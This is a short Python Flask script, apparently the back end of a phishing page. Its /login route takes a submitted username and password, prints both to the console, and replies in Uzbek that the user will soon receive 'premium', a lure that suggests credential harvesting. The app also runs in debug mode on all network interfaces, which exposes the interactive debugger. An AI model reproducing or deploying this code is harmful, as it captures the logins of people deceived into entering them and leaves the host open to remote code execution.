from flask import Flask , request , render_template

app = Flask(__name__)




@app.route('/')
def home():
    return render_template("index.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    print("Username:", username)
    print("Password:", password)
    
    return "Yaqinda sizga premium beriladi"

app.run(host='0.0.0.0', port=8000, debug=True)